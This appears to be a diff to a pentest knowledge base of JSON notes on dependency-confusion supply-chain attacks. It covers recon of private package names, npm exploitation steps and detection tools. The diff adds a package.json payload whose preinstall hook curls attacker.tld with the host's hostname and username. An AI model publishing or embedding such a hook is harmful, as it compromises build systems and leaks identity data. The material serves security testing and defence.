@@ -6,32 +6,59 @@
       "subcategory": "Methodology",
       "title": "What is Dependency Confusion",
       "language": "text",
-      "tags": ["methodology", "supply-chain"],
+      "tags": [
+        "methodology",
+        "supply-chain"
+      ],
       "body": "Dependency Confusion (a dependency substitution attack, also known as supply chain substitution) happens when an install script is tricked into downloading a malicious file from a public repository instead of the intended file with the same name from a company's internal (private) repository.\n\nThe gist: the package manager sees a package in the public registry with the same name as a private one but with a higher version, and pulls exactly that public (malicious) package. This is how the attacker's code ends up in the victim's build or environment."
     },
     {
       "subcategory": "Methodology",
       "title": "The attack idea and where to find private package names",
       "language": "text",
-      "tags": ["methodology", "recon"],
+      "tags": [
+        "methodology",
+        "recon"
+      ],
       "body": "Look for npm, pip, gem packages - the methodology is the same: you register a public package with the same name as a private one used by the company, and wait until it gets pulled in.\n\nWhere to look for private package names:\n- Dependency manifests in source code and artifacts: package.json, composer.json, requirements.txt, pom.xml, Dockerfile.\n- Leaked or public builds, frontend JS bundles, build errors in CI, caches.\n\nAlgorithm: list all dependencies from the manifests -> find the ones that are not in the public registry -> register a public package with the same name."
     },
     {
       "subcategory": "Methodology",
       "title": "Ecosystem -> dependency manifest file",
       "language": "table",
-      "tags": ["methodology", "recon"],
+      "tags": [
+        "methodology",
+        "recon"
+      ],
       "body": "",
       "meta": {
         "kind": "table",
         "table": {
-          "headers": ["Ecosystem (manager)", "Manifest file"],
+          "headers": [
+            "Ecosystem (manager)",
+            "Manifest file"
+          ],
           "rows": [
-            ["DockerHub", "Dockerfile image"],
-            ["JavaScript (npm)", "package.json"],
-            ["MVN (maven)", "pom.xml"],
-            ["PHP (composer)", "composer.json"],
-            ["Python (pypi)", "requirements.txt"]
+            [
+              "DockerHub",
+              "Dockerfile image"
+            ],
+            [
+              "JavaScript (npm)",
+              "package.json"
+            ],
+            [
+              "MVN (maven)",
+              "pom.xml"
+            ],
+            [
+              "PHP (composer)",
+              "composer.json"
+            ],
+            [
+              "Python (pypi)",
+              "requirements.txt"
+            ]
           ]
         }
       }
@@ -40,14 +67,33 @@
       "subcategory": "NPM",
       "title": "NPM - step-by-step exploitation scenario",
       "language": "text",
-      "tags": ["npm", "javascript", "exploitation"],
+      "tags": [
+        "npm",
+        "javascript",
+        "exploitation"
+      ],
       "body": "Scenario using npm as an example:\n\n1. List all packages from the manifests (package.json, composer.json, ...).\n2. Find a package that is not on www.npmjs.com (absent from the public registry - a substitution candidate).\n3. Register and create a PUBLIC package with the same name.\n\nExample exploit package: 0xsapra/dependency-confusion-expoit (github.com/0xsapra/dependency-confusion-expoit)."
+    },
+    {
+      "subcategory": "NPM",
+      "title": "NPM — the execution primitive (preinstall/postinstall)",
+      "language": "json",
+      "tags": [
+        "dependency-confusion",
+        "npm",
+        "postinstall",
+        "rce"
+      ],
+      "body": "// Code runs through npm lifecycle scripts at INSTALL time.\n// Publish to the public npm a package with the private name and a version above any internal one:\n{\n  \"name\": \"@org/internal-lib\",\n  \"version\": \"99.9.9\",\n  \"scripts\": {\n    \"preinstall\": \"node -e \\\"require('child_process').exec('curl https://attacker.tld/cb?h='+require('os').hostname()+'.'+require('os').userInfo().username)\\\"\"\n  }\n}\n// the victim's npm install (often in CI) -> callback. Bonus: a misconfigured .npmrc/scoped registry resolves @org to public npm."
     },
     {
       "subcategory": "Tools",
       "title": "Tools for finding dependency confusion",
       "language": "text",
-      "tags": ["tools", "automation"],
+      "tags": [
+        "tools",
+        "automation"
+      ],
       "body": "- visma-prodsec/confused - checks for dependency confusion vulnerabilities across several package management systems (github.com/visma-prodsec/confused).\n- synacktiv/DepFuzzer - finds dependency confusion or projects where you can take over the package owner's email (github.com/synacktiv/DepFuzzer)."
     }
   ]
